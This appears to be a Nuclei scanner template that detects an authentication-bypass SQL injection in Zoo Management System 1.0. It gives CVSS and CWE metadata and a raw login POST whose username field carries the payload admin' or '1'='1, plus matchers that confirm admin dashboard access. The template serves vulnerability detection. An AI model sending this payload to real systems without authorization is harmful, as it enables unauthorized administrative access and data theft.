id: zms-sqli
info:
  name: Zoo Management System 1.0 - SQL Injection
  author: arafatansari
  severity: critical
  description: Zoo Management System 1.0 has a SQL Injection vulnerability that allows
    attackers to gain access to sensitive information or unauthorized administrative
    operations by manipulating the username parameter on the login page.
  reference:
  - https://www.exploit-db.com/exploits/48880
  - https://packetstormsecurity.com/files/167572/Zoo-Management-System-1.0-Cross-Site-Scripting.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    verified: true
    impact: The SQL injection vulnerability in Zoo Management System 1.0 can lead
      to the compromise of sensitive information, unauthorized manipulation of data,
      and performing administrative actions by an attacker.
    recommendation: It is recommended to immediately update to a secure version of
      Zoo Management System to avoid potential SQL injection attacks.
  tags: edb,packetstorm,zms,sqli,auth-bypass,cms
requests:
- raw:
  - 'POST /admin/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=admin%27+or+%271%27%3D%271&password=any&login=

    '
  host-redirects: true
  max-redirects: 2
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - ZMS ADMIN
    - Dashboard
    - Zoo Management System
    condition: and
  - type: status
    status:
    - 200
